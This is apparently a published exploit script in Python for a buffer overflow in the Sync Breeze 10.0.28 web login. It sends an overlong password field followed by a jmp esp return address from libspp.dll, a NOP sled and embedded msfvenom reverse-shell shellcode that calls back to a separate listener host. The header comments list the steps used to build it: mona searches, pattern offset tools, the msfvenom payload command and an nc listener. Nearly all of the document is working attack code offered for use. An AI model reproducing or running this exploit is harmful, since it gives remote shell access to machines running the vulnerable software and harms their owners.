#!/usr/bin/python3
# www.syncbreeze.com
# Date: 09-Jul-2024
# Exploit Author: Dxmostacero
# Version: 10.0.28
# Tested on: Windows 10 22H2 64-bit - OS Build 19045.4598
# jmp esp FFE4 \xff\xe4
# !mona modules
# !mona find -s "\xff\xe4" -m libspp.dll
# ESP 0x10090c83 - libspp.dll
# badchars = \x00\x0a\x0d\x25\x26\x2b\x3d
# offset math 520
# Pattern Create - /usr/bin/msf-pattern_create -l 2200
# Pattern Offset - /usr/bin/msf-pattern_offset -l 2200 -q 72413372
# Generating The Payload - msfvenom -p windows/shell_reverse_tcp lhost=172.16.0.3 lport=443 exitfunc=thread -b "\x00\x0a\x0d\x25\x26\x2b\x3d" -f c
# Listening - nc -vlnp 443

import socket

shell =  b""
shell += b"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
shell += b"\x0e\x03\x8c\xb5\x8f\x83\xee\xfc\xe2\xf4\xff\x64\x37\x8f"
shell += b"\x03\x8c\xd5\x06\xe6\xbd\x75\xeb\x88\xdc\x85\x04\x51\x80"
shell += b"\x3e\xdd\x17\x07\xc7\xa7\x0c\x3b\xff\xa9\x32\x73\x19\xb3"
shell += b"\x62\xf0\xb7\xa3\x23\x4d\x7a\x82\x02\x4b\x57\x7d\x51\xdb"
shell += b"\x3e\xdd\x13\x07\xff\xb3\x88\xc0\xa4\xf7\xe0\xc4\xb4\x5e"
shell += b"\x52\x07\xec\xaf\x02\x5f\x3e\xc6\x1b\x6f\x8f\xc6\x88\xb8"
shell += b"\x3e\x8e\xd5\xbd\x4a\x23\xc2\x43\xb8\x8e\xc4\xb4\x55\xfa"
shell += b"\xf5\x8f\xc8\x77\x38\xf1\x91\xfa\xe7\xd4\x3e\xd7\x27\x8d"
shell += b"\x66\xe9\x88\x80\xfe\x04\x5b\x90\xb4\x5c\x88\x88\x3e\x8e"
shell += b"\xd3\x05\xf1\xab\x27\xd7\xee\xee\x5a\xd6\xe4\x70\xe3\xd3"
shell += b"\xea\xd5\x88\x9e\x5e\x02\x5e\xe4\x86\xbd\x03\x8c\xdd\xf8"
shell += b"\x70\xbe\xea\xdb\x6b\xc0\xc2\xa9\x04\x73\x60\x37\x93\x8d"
shell += b"\xb5\x8f\x2a\x48\xe1\xdf\x6b\xa5\x35\xe4\x03\x73\x60\xdf"
shell += b"\x53\xdc\xe5\xcf\x53\xcc\xe5\xe7\xe9\x83\x6a\x6f\xfc\x59"
shell += b"\x22\xe5\x06\xe4\x19\x9f\x03\x8f\xdd\x8d\x03\x8d\x0e\x06"
shell += b"\xe5\xe6\xa5\xd9\x54\xe4\x2c\x2a\x77\xed\x4a\x5a\x86\x4c"
shell += b"\xc1\x83\xfc\xc2\xbd\xfa\xef\xe4\x45\x3a\xa1\xda\x4a\x5a"
shell += b"\x6b\xef\xd8\xeb\x03\x05\x56\xd8\x54\xdb\x84\x79\x69\x9e"
shell += b"\xec\xd9\xe1\x71\xd3\x48\x47\xa8\x89\x8e\x02\x01\xf1\xab"
shell += b"\x13\x4a\xb5\xcb\x57\xdc\xe3\xd9\x55\xca\xe3\xc1\x55\xda"
shell += b"\xe6\xd9\x6b\xf5\x79\xb0\x85\x73\x60\x06\xe3\xc2\xe3\xc9"
shell += b"\xfc\xbc\xdd\x87\x84\x91\xd5\x70\xd6\x37\x55\x92\x29\x86"
shell += b"\xdd\x29\x96\x31\x28\x70\xd6\xb0\xb3\xf3\x09\x0c\x4e\x6f"
shell += b"\x76\x89\x0e\xc8\x10\xfe\xda\xe5\x03\xdf\x4a\x5a"

# offset math 520
login = "username=Dxm&password=" + "A" * 520

# ESP 0x10090c83 - libspp.dll
data  = b"\x83\x0c\x09\x10" + b"\x90" * 32 + shell

content_length = len(data) + len(login)

request = (
    "POST /login HTTP/1.1\r\n"
    "Host: 172.16.0.1\r\n"
    "Content-Length: {}\r\n"
    "Cache-Control: max-age=0\r\n"
    "Accept-Language: en-US\r\n"
    "Upgrade-Insecure-Requests: 1\r\n"
    "Origin: http://172.16.0.1\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36\r\n"
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
    "Referer: http://172.16.0.1/login\r\n"
    "Accept-Encoding: gzip, deflate, br\r\n"
    "Connection: keep-alive\r\n"
    "\r\n"
).format(content_length)

request_full = request.encode() + login.encode() + data

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("172.16.0.1", 80))
s.send(request_full)

s.recv(1024)

s.close()
